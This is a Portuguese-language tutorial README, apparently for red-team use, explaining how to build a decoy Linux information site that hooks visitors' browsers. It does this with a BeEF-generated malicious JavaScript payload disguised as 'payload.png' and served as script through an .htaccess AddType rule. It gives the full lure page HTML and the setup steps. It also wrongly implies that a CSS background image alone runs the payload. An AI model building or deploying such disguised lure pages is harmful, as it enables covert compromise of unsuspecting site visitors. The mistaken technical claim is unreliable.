# css_load
For pentests, redteam and blueteam of active countermeasures

# Tutorial: Criando um Mini Site sobre Linux com Payload Beef


Alguns anos atrás eu realizei um [POST](https://medium.com/@0uts1d3r/traps-for-your-opponent-php-scripts-in-images-b185f6481103) no Medium falando sobre scripts PHP em imagens que na verdade é uma biblioteca PHP que pode converter um script `.PHP` em uma imagem e junto com o arquivo .htaccess no servidor fazer com que pareça realmente uma imagem mas na verdade é um script `.PHP` executando codigos ocultos no background.  

Neste tutorial, você aprenderá como criar um mini site sobre Linux (ou qualquer coisa que quiser. dica: Utilize chatGPT.) que contém uma imagem com uma div incorporando um arquivo .png que está sendo processado como .js pelo servidor. Para isso, usaremos o Beef para gerar um payload JavaScript malicioso, configuraremos um servidor PHP para processar arquivos .png como .js e criaremos um código HTML para o mini site.  

## Passo 1: Configurar o Beef

1. Instale e configure o Beef. Você pode encontrar instruções detalhadas de instalação na documentação oficial do Beef: [Beef - Installing](https://github.com/beefproject/beef/wiki/Installing).
2. Inicie o Beef e acesse o painel de controle.

## Passo 2: Gerar o Payload

1. No painel de controle do Beef, navegue até a seção "Modules" e selecione "Exploits".
2. Escolha um exploit para gerar um payload JavaScript malicioso. Por exemplo, você pode selecionar um exploit que visa sistemas Linux.
3. Configure as opções do exploit conforme necessário e gere o payload JavaScript.

## Passo 3: Configurar o Servidor PHP

1. Crie um arquivo `.htaccess` no diretório do seu servidor PHP ou adicione as configurações ao arquivo `.htaccess` existente.
2. Adicione a seguinte linha ao arquivo `.htaccess` para que os arquivos `.png` sejam tratados como `.js`:

```
AddType application/javascript .png
```

### Tipos MIME:  
```
AddType application/x-httpd-php .php
AddType application/javascript .png
AddType text/css .txt



image/png: para arquivos PNG de imagem padrão.
application/javascript: para arquivos JavaScript.
text/css: para arquivos CSS.
text/html: para arquivos HTML.
application/xml: para arquivos XML.
application/json: para arquivos JSON.
image/svg+xml: para arquivos SVG.
```

## Passo 4: Criar o Código HTML

Aqui está um exemplo de código HTML para o mini site sobre Linux:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mini Site sobre Linux</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #333;
            color: #fff;
            padding: 10px;
            text-align: center;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #f9f9f9;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .background {
            width: 500px;
            height: 300px;
            background-image: url('payload.png');
            background-size: cover;
            margin: 20px auto;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Mini Site sobre Linux</h1>
    </div>
    <div class="container">
        <h2>O que é o Linux?</h2>
        <p>O Linux é um sistema operacional de código aberto baseado em Unix que é amplamente utilizado em servidores e sistemas embarcados. Ele oferece uma variedade de distribuições, como Ubuntu, Fedora, CentOS e muitos outros.</p>
        <h2>Ajuste de Core do Kernel do Linux</h2>
        <p>O kernel do Linux oferece uma ampla gama de opções de ajuste para otimizar o desempenho do sistema. Isso inclui ajustes de agendamento de processos, gerenciamento de memória, configuração de rede e muito mais.</p>
        <h2>Comandos Básicos do Linux</h2>
        <p>Alguns comandos básicos do Linux incluem:</p>
        <ul>
            <li><code>ls</code>: listar arquivos e diretórios</li>
            <li><code>cd</code>: mudar de diretório</li>
            <li><code>mkdir</code>: criar um novo diretório</li>
            <li><code>rm</code>: remover arquivos ou diretórios</li>
            <li><code>cp</code>: copiar arquivos ou diretórios</li>
            <li><code>mv</code>: mover arquivos ou diretórios</li>
            <li><code>sudo</code>: executar um comando com privilégios de superusuário</li>
        </ul>
        <h2>Segurança no Linux</h2>
        <p>O Linux é conhecido por sua forte segurança, mas ainda existem práticas recomendadas para garantir a segurança do sistema, incluindo:</p>
        <ul>
            <li>Mantenha o sistema atualizado com patches de segurança</li>
            <li>Use senhas fortes e altere-as regularmente</li>
            <li>Configure corretamente as permissões de arquivo e diretório</li>
            <li>Use firewalls para controlar o tráfego de rede</li>
            <li>Monitore o sistema em busca de atividades suspeitas</li>
        </ul>
    </div>
    <div class="background"></div>
    <script src="payload.png"></script> <!-- Comente este codigo caso queira utilizar payload.php, ele configurado no CSS3 ja é o suficiente. -->
</body>
</html>

```

## Passo 5: Testar o Mini Site

1. Coloque o arquivo `.htaccess` no diretório do servidor PHP.
2. Coloque o arquivo HTML e o arquivo de payload gerado pelo Beef no diretório do servidor PHP.
3. Inicie o servidor PHP.
4. Acesse o mini site no navegador para testar.

Com este tutorial, você deve ser capaz de criar um mini site sobre Linux com uma imagem que contém um arquivo .png incorporado como .js, que é processado pelo servidor PHP. Certifique-se de usar essas técnicas de maneira ética e legal.
